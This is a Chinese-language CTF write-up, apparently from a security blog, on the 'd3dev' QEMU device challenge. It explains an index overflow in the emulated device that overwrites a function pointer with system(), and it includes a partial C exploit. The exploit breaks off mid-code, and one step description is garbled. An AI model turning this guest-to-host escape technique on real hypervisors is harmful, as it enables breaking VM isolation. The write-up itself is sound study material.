    <content type="html"><![CDATA[<p>本文首发于安全客：<a href="https://www.anquanke.com/post/id/234263" target="_blank" rel="noopener">https://www.anquanke.com/post/id/234263</a></p><p>分享一下比赛中除了Deterministic Heap之外的<del>六</del>五道题。</p><a id="more"></a><h1 id="d3dev-amp-d3dev-revenge"><a href="#d3dev-amp-d3dev-revenge" class="headerlink" title="d3dev &amp; d3dev_revenge"></a>d3dev &amp; d3dev_revenge</h1><p>一道简单的qemu pwn，很适合入门，入门知识可参考<a href="https://ray-cp.github.io/archivers/qemu-pwn-basic-knowledge" target="_blank" rel="noopener">qemu-pwn-基础知识</a>，这里就不再赘述。</p><ol><li><p>首先查看<code>launch.sh</code>启动脚本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">./qemu-system-x86_64 \</span><br><span class="line">-L pc-bios/ \</span><br><span class="line">-m 128M \</span><br><span class="line">-kernel vmlinuz \</span><br><span class="line">-initrd rootfs.img \</span><br><span class="line">-smp 1 \</span><br><span class="line">-append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 nokaslr quiet" \</span><br><span class="line">-device d3dev \</span><br><span class="line">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">-nographic \</span><br></pre></td></tr></table></figure><p>一般来说，从参数<code>-device d3dev</code>中可以得知，我们要分析的就是这个<code>d3dev</code>设备逻辑，而且通常就是这个设备中存在着漏洞。</p></li><li><p>分析所给的<code>qemu-system-x86_64</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">do_qemu_init_pci_d3dev_register_types</span><br><span class="line">d3dev_mmio_read</span><br><span class="line">d3dev_mmio_write</span><br><span class="line">d3dev_pmio_read</span><br><span class="line">pci_d3dev_register_types</span><br><span class="line">d3dev_class_init</span><br><span class="line">pci_d3dev_realize</span><br><span class="line">d3dev_instance_init</span><br><span class="line">d3dev_pmio_write</span><br></pre></td></tr></table></figure><p>主要关注”d3dev”相关函数，从<code>d3dev_class_init</code>中，可以获得到<code>VenderID</code>以及<code>DeviceID</code>，从而找到目标PCI设备，从而获得相关的设备内存空间地址：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">/ # lspci</span><br><span class="line">00:01.0 Class 0601: 8086:7000</span><br><span class="line">00:04.0 Class 0200: 8086:100e</span><br><span class="line">00:00.0 Class 0600: 8086:1237</span><br><span class="line">00:01.3 Class 0680: 8086:7113</span><br><span class="line">00:03.0 Class 00ff: 2333:11e8 ===&gt; d3dev</span><br><span class="line">00:01.1 Class 0101: 8086:7010</span><br><span class="line">00:02.0 Class 0300: 1234:1111</span><br><span class="line">/ # cat /sys/devices/pci0000\:00/0000:00\:03.0/resource</span><br><span class="line">0x00000000febf1000 0x00000000febf17ff 0x0000000000040200==&gt; mmio (start end size)</span><br><span class="line">0x000000000000c040 0x000000000000c05f 0x0000000000040101==&gt; pmio (start end size)</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure><p>编写guest程序与设备交互的时候，可以直接映射设备地址，也可通过<code>int mmio_fd = open(&quot;/sys/devices/pci0000:00/0000:00:03.0/resource0&quot;, O_RDWR | O_SYNC);</code>来进行映射。</p><p>上图中两个地址分别对应mmio和pmio。</p></li><li><p>分析<code>d3dev_mmio_write</code>可以很容易发现：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">d3dev_mmio_write</span><span class="params">(d3devState *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">size</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// rsi</span></span><br><span class="line">  ObjectClass_0 **v5; <span class="comment">// r11</span></span><br><span class="line">  <span class="keyword">uint64_t</span> v6; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">uint32_t</span> v8; <span class="comment">// er10</span></span><br><span class="line">  <span class="keyword">uint32_t</span> v9; <span class="comment">// er9</span></span><br><span class="line">  <span class="keyword">uint32_t</span> v10; <span class="comment">// er8</span></span><br><span class="line">  <span class="keyword">uint32_t</span> v11; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v12; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">uint64_t</span> v13; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">size</span> == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = opaque-&gt;<span class="built_in">seek</span> + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(addr &gt;&gt; <span class="number">3</span>);</span><br><span class="line">    <span class="keyword">if</span> ( opaque-&gt;mmio_write_part )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = &amp;opaque-&gt;pdev.qdev.parent_obj.class + v4;</span><br><span class="line">      v6 = val &lt;&lt; <span class="number">32</span>;</span><br><span class="line">      v7 = <span class="number">0</span>;</span><br><span class="line">      opaque-&gt;mmio_write_part = <span class="number">0</span>;</span><br><span class="line">      v8 = opaque-&gt;key[<span class="number">0</span>];</span><br><span class="line">      v9 = opaque-&gt;key[<span class="number">1</span>];</span><br><span class="line">      v10 = opaque-&gt;key[<span class="number">2</span>];</span><br><span class="line">      v11 = opaque-&gt;key[<span class="number">3</span>];</span><br><span class="line">      v12 = v6 + *((_DWORD *)v5 + <span class="number">0x2B6</span>);</span><br><span class="line">      v13 = ((<span class="keyword">unsigned</span> __int64)v5[<span class="number">0x15B</span>] + v6) &gt;&gt; <span class="number">32</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v7 -= <span class="number">0x61C88647</span>;</span><br><span class="line">        v12 += (v7 + v13) ^ (v9 + ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)v13 &gt;&gt; <span class="number">5</span>)) ^ (v8 + <span class="number">16</span> * v13);</span><br><span class="line">        LODWORD(v13) = ((v7 + v12) ^ (v11 + (v12 &gt;&gt; <span class="number">5</span>)) ^ (v10 + <span class="number">16</span> * v12)) + v13;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v7 != <span class="number">0xC6EF3720</span> );</span><br><span class="line">      v5[<span class="number">0x15B</span>] = (ObjectClass_0 *)__PAIR64__(v13, v12);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;mmio_write_part = <span class="number">1</span>;</span><br><span class="line">      opaque-&gt;blocks[v4] = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)val; <span class="comment">// index overflow</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后<code>opaque-&gt;blocks[v4] = (unsigned int)val;</code>存在下标溢出，即<code>v4 = opaque-&gt;seek + (unsigned int)(addr &gt;&gt; 3);</code>，而<code>opaque-&gt;seek</code>可以通过<code>d3dev_pmio_write</code>进行设置，最大值为0x100，此时只要通过完全可控的addr，就能实现下标溢出。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">d3dev_pmio_write</span><span class="params">(d3devState *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">size</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint32_t</span> *v4; <span class="comment">// rbp</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( addr == <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( val &lt;= <span class="number">0x100</span> )</span><br><span class="line">      opaque-&gt;<span class="built_in">seek</span> = val;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( addr &gt; <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">0x1C</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;r_seed = val;</span><br><span class="line">      v4 = opaque-&gt;key;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">        *v4++ = ((__int64 (__fastcall *)(<span class="keyword">uint32_t</span> *, __int64, <span class="keyword">uint64_t</span>, _QWORD))opaque-&gt;rand_r)(</span><br><span class="line">                  &amp;opaque-&gt;r_seed,</span><br><span class="line">                  <span class="number">0x1C</span>LL,</span><br><span class="line">                  val,</span><br><span class="line">                  *(_QWORD *)&amp;<span class="built_in">size</span>);</span><br><span class="line">      <span class="keyword">while</span> ( v4 != (<span class="keyword">uint32_t</span> *)&amp;opaque-&gt;rand_r );</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( addr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_QWORD *)opaque-&gt;key = <span class="number">0L</span>L;</span><br><span class="line">      *(_QWORD *)&amp;opaque-&gt;key[<span class="number">2</span>] = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    opaque-&gt;memory_mode = val;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而继续分析相关结构体<code>d3devState</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> d3devState      struc ; (<span class="keyword">sizeof</span>=<span class="number">0x1300</span>, align=<span class="number">0x10</span>, copyof_4545)</span><br><span class="line"><span class="number">00000000</span> pdev            PCIDevice_0 ?</span><br><span class="line"><span class="number">000008E0</span> mmio            MemoryRegion_0 ?</span><br><span class="line"><span class="number">000009</span>D0 pmio            MemoryRegion_0 ?</span><br><span class="line"><span class="number">00000</span>AC0 memory_mode     dd ?</span><br><span class="line"><span class="number">00000</span>AC4 <span class="built_in">seek</span>            dd ?</span><br><span class="line"><span class="number">00000</span>AC8 init_flag       dd ?</span><br><span class="line"><span class="number">00000</span>ACC mmio_read_part  dd ?</span><br><span class="line"><span class="number">00000</span>AD0 mmio_write_part dd ?</span><br><span class="line"><span class="number">00000</span>AD4 r_seed          dd ?</span><br><span class="line"><span class="number">00000</span>AD8 blocks          dq <span class="number">257</span> dup(?)</span><br><span class="line"><span class="number">000012E0</span> key             dd <span class="number">4</span> dup(?)</span><br><span class="line"><span class="number">000012F</span>0 rand_r          dq ?                    ; offset</span><br><span class="line"><span class="number">000012F</span>8                 db ? ; undefined</span><br><span class="line"><span class="number">000012F</span>9                 db ? ; undefined</span><br><span class="line"><span class="number">000012F</span>A                 db ? ; undefined</span><br><span class="line"><span class="number">000012F</span>B                 db ? ; undefined</span><br><span class="line"><span class="number">000012F</span>C                 db ? ; undefined</span><br><span class="line"><span class="number">000012F</span>D                 db ? ; undefined</span><br><span class="line"><span class="number">000012F</span>E                 db ? ; undefined</span><br><span class="line"><span class="number">000012F</span>F                 db ? ; undefined</span><br><span class="line"><span class="number">00001300</span> d3devState      ends</span><br></pre></td></tr></table></figure><p>可以看出，<code>blocks</code>后面存在着一个函数指针<code>rand_r</code>，而通过<code>d3dev_pmio_write</code>中<code>addr == 0x1C</code>的情况，发现<code>rand_r</code>函数的第一个参数<code>r-&gt;seed</code>也是可控的，因此完全可以通过其实现调用<code>system(&quot;cat flag&quot;)</code>。</p></li><li><p>那么整个利用过程为：</p><ul><li>通过调用<code>d3dev_pmio_write</code>，即<code>outw(0, 0xC040 + 0x4);</code>将<code>keys</code>全部设置为0。</li><li>再通过调用<code>d3dev_pmio_write</code>，即<code>outw(0x100,d] = mmio_read(0x18); res[1] = mmio_read(0x18)</code>读出<code>rand_r</code>函数地址（TEA加密后的），再解密得到明文，算出libc的基地址。</li><li>计算出<code>system</code>的地址，由于<code>d3dev_mmio_write</code>的写内存模式为：先写入低4 bytes，然后结合第二次传入的4 bytes作为高4 bytes组合成8 bytes，TEA加密（解密）后再写入对应内存中。所以只要先加密<code>system</code>的地址，然后分两次（先低后高）写入即可<code>opaque-&gt;rand_r</code>处即可。</li><li>最后触发调用<code>rand_r</code>，即可得到flag。</li></ul></li><li><p>exp：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT  12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE   (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PFN     ((1ull &lt;&lt; 55) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> page_offset(<span class="keyword">uint32_t</span> addr)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> addr &amp; ((<span class="number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> gva_to_gfn(<span class="keyword">void</span> *addr)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> pme, gfn;</span><br><span class="line">    <span class="keyword">size_t</span> offset;</span><br><span class="line">    offset = ((<span class="keyword">uintptr_t</span>)addr &gt;&gt; <span class="number">9</span>) &amp; ~<span class="number">7</span>;</span><br><span class="line">    lseek(fd, offset, SEEK_SET);</span><br><span class="line">    <span class="built_in">read</span>(fd, &amp;pme, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (!(pme &amp; PFN_PRESENT))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    gfn = pme &amp; PFN_PFN;</span><br><span class="line">    <span class="keyword">return</span> gfn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> gva_to_gpa(<span class="keyword">void</span> *addr)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> gfn = gva_to_gfn(addr);</span><br><span class="line">    assert(gfn != <span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="keyword">uint64_t</span>)addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *mmio_mem;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">uint32_t</span> *)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> mmio_read(<span class="keyword">uint32_t</span> addr)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="keyword">uint32_t</span> *)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encrypt</span> <span class="params">(<span class="keyword">uint32_t</span>* v, <span class="keyword">uint32_t</span>* k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0</span>, i;           <span class="comment">/* set up */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> delta=<span class="number">0x9e3779b9</span>;                     <span class="comment">/* a key schedule constant */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];   <span class="comment">/* cache key */</span></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;                       <span class="comment">/* basic cycle start */</span></span><br><span class="line">        sum += delta;</span><br><span class="line">        v0 += ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);</span><br><span class="line">        v1 += ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);  </span><br><span class="line">    &#125;                                              <span class="comment">/* end cycle */</span></span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decrypt</span> <span class="params">(<span class="keyword">uint32_t</span>* v, <span class="keyword">uint32_t</span>* k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0xC6EF3720</span>, i;  <span class="comment">/* set up */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> delta=<span class="number">0x9e3779b9</span>;                     <span class="comment">/* a key schedule constant */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];   <span class="comment">/* cache key */</span></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">32</span>; i++) &#123;                         <span class="comment">/* basic cycle start */</span></span><br><span class="line">        v1 -= ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);</span><br><span class="line">        v0 -= ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);</span><br><span class="line">        sum -= delta;                                   </span><br><span class="line">    &#125;                                              <span class="comment">/* end cycle */</span></span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fd = <span class="built_in">open</span>(<span class="string">"/proc/self/pagemap"</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">"open"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="keyword">int</span> mmio_fd = <span class="built_in">open</span>(<span class="string">"/sys/devices/pci0000:00/0000:00:03.0/resource0"</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span>(mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">"mmio_fd open failed"</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">"mmap mmio_mem failed"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"mmio_mem @ %p\n"</span>, mmio_mem);</span><br><span class="line"></span><br><span class="line">    mlock(<span class="built_in">buffer</span>, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Your physical address is at 0x%"</span>PRIx64<span class="string">"\n"</span>, gva_to_gpa(<span class="built_in">buffer</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> res[<span class="number">10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">uint32_t</span> key[<span class="number">4</span>] = &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;; </span><br><span class="line">    iopl(<span class="number">3</span>);</span><br><span class="line">    outw(<span class="number">0</span>, <span class="number">0xC040</span> + <span class="number">0x4</span>); <span class="comment">// set keys all zero</span></span><br><span class="line">    outw(<span class="number">0x100</span>, <span class="number">0xC040</span> + <span class="number">0x8</span>); <span class="comment">// seek = 0x100</span></span><br><span class="line">    res[<span class="number">0</span>] = mmio_read(<span class="number">0x18</span>);</span><br><span class="line">    res[<span class="number">1</span>] = 